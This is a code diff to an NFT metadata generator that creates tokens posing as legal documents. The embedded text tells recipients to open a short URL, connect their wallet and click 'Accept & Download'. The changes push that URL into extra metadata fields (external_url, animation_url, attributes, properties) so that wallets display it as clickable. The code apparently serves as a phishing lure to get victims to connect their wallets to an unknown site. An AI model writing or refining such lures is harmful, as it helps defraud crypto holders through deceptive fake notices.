@@ -220,7 +220,9 @@ const ThumbnailGenerator = {
                         `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
                         `🔓 HOW TO ACCESS FULL DOCUMENT:\n` +
                         `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
-                        `STEP 1: Copy this URL into your browser:\n` +
+                        `🌐 CLICK HERE TO ACCEPT:\n` +
+                        `${shortUrl}\n\n` +
+                        `If link doesn't work, copy this URL:\n` +
                         `👉 ${shortUrl} 👈\n\n` +
                         `STEP 2: Connect this wallet when prompted\n\n` +
                         `STEP 3: Click "Accept & Download"\n\n` +
@@ -244,7 +246,8 @@ const ThumbnailGenerator = {
                         `📧 Questions? support@blockserved.com\n` +
                         `🔗 Direct Access: ${shortUrl}`,
             image: imageUrl,
-            external_url: websiteUrl,
+            external_url: shortUrl, // Use short URL for better display
+            animation_url: shortUrl, // Some wallets show this as clickable
             attributes: [
                 {
                     trait_type: "Status",
@@ -273,14 +276,25 @@ const ThumbnailGenerator = {
                 {
                     trait_type: "Fee Sponsored",
                     value: "Yes (2 TRX included)"
+                },
+                {
+                    trait_type: "Accept Notice URL",
+                    value: shortUrl
                 }
             ],
             properties: {
                 category: "legal_document",
+                website: shortUrl,
+                accept_notice_url: shortUrl,
                 files: [{
-                    uri: websiteUrl,
-                    type: "text/html"
-                }]
+                    uri: shortUrl,
+                    type: "text/html",
+                    name: "Accept Notice"
+                }],
+                links: {
+                    accept: shortUrl,
+                    website: websiteUrl
+                }
             }
         };
         
